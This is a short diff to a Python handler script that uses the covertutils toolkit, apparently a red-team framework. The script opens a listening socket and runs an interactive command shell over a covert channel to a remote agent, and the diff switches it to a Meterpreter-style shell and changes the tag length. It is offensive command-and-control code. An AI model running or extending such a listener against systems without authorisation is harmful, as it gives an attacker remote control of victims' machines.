@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# from covertutils.shells.impl import MeterpreterShell
+from covertutils.shells.impl import MeterpreterShell
 from covertutils.shells.impl import ExtendableShell
 
 from covertutils.handlers import BaseHandler
@@ -20,7 +20,7 @@ except :
 
 addr = '0.0.0.0', int(port)
 
-orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50 )
+orch = SimpleOrchestrator( passphrase, tag_length = 3, out_length = 50, in_length = 50 )
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	#
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -53,6 +53,6 @@ class MyHandler( BaseHandler ) :
 		s.close()
 
 handler = MyHandler( recv, send, orch )
-shell = ExtendableShell(handler, prompt = "(%s:%d)> " % client_addr )
+shell = MeterpreterShell(handler, prompt = "(%s:%d)> " % client_addr )
 
 shell.start()
